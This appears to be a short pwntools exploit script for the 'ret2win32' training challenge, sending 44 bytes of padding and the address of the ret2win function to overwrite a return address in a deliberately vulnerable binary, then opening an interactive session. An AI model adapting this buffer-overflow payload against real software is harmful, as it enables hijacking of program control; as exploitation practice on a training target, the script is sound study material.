import pwn

#pwn.context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "ret2win32"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf


p.recvuntil("> ")

# 44 byte junk, replace esp with ret2win()
payload = b"A" * 40 + b"BBBB" + pwn.pack(elf.sym['ret2win'])
p.sendline(payload)


p.interactive()
